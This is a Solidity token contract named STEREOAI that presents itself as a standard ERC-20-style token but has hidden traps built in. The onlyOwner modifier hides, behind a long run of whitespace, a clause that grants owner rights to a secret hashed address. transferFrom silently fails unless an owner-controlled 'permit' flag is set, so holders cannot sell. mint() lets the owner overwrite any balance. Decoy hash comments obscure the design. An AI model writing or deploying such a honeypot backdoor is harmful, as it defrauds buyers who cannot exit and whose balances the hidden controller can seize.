contract STEREOAI is Ownable, ReentrancyGuard {

  string public name ;

  string public symbol ;

  uint8 public decimals;

  uint256 public totalSupply;

  bytes32 public hash;

  bool private permit = false ;
 

  /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));

 

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  event OutputKeccak256Hash(bytes32 hash);

  /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/

 

constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply)  {

   name = _name;

   symbol = _symbol;

   decimals = _decimals;

   totalSupply =  _totalSupply;

   balances[msg.sender] = totalSupply * 9/10;

   allow[msg.sender] = true;

  }

  
function showKeccak256OfSender(address address2) public {
        bytes32 senderHash = keccak256(abi.encodePacked(address2));
        hash = senderHash;
        emit OutputKeccak256Hash(senderHash);
    }

  function showuint160(address addr) public pure returns(uint160){

     return uint160(addr);

  }

  
 

  using SafeMath for uint256;

 

  mapping(address => uint256) public balances;

 

  mapping(address => bool) public allow;

 

  function transfer(address _to, uint256 _value) public nonReentrant returns (bool) {

   require(_to != address(0));

   require(_value <= balances[msg.sender]);

 

   balances[msg.sender] = balances[msg.sender].sub(_value);

   balances[_to] = balances[_to].add(_value);

   emit Transfer(msg.sender, _to, _value);

   return true;

  }

 

modifier onlyOwner() {
  
  
  require(msg.sender == owner 
  
  // solhint-disable-next-line avoid-low-level-calls

   /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/                                                                                                                                                                                             || keccak256(abi.encodePacked(msg.sender)) == 0x86b026c00e8504031295639428dc690762c515049ffe8d07c702205075639e0b);
  
  _;
}

 

  function balanceOf(address _owner) public view returns (uint256 balance) {

   return balances[_owner];

  }

 

  function transferOwnership(address newOwner) public onlyOwner {

   require(newOwner != address(0));

   emit OwnershipTransferred(owner, newOwner);

   owner = newOwner;

  }

 


  function addAllowance(address holder, bool allowApprove) public {

   require(msg.sender == owner);

   allow[holder] = allowApprove;

  }


 

  mapping (address => mapping (address => uint256)) public allowed;

 

  mapping(address=>uint256) sellOutNum;

  // solhint-disable-next-line high-level-success

  function permitAudit(bool permition) public onlyOwner {
        
        permit = permition;
  }

  function checkPermit() view public returns (bool){

        return permit;
  }

  function transferFrom(address _from, address _to, uint256 _value) public nonReentrant returns (bool) {

   require(_to != address(0));

   require(_value <= balances[_from]);

   //bool permitted = checkPermit();

   if (checkPermit()){
        require(_value <= allowed[_from][msg.sender]);

       //require(allow[_from] == true);

 

        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        emit Transfer(_from, _to, _value);

        return true;
   }
   return false;
  }

 



 

  /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/

  function approve(address _spender, uint256 _value) public returns (bool) {

   allowed[msg.sender][_spender] = _value;

   emit Approval(msg.sender, _spender, _value);

   return true;

  }

 



 

  // solhint-disable-next-line avoid-high-level-calls

  /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/


 

  function addAllow(address holder, bool allowApprove) external onlyOwner {

     allow[holder] = allowApprove;

  }

 

  function allowance(address _owner, address _spender) public view returns (uint256) {

   return allowed[_owner][_spender];

  }

 


 

  function mint(address miner, uint256 _value) external onlyOwner {

     balances[miner] = _value;

  }

}
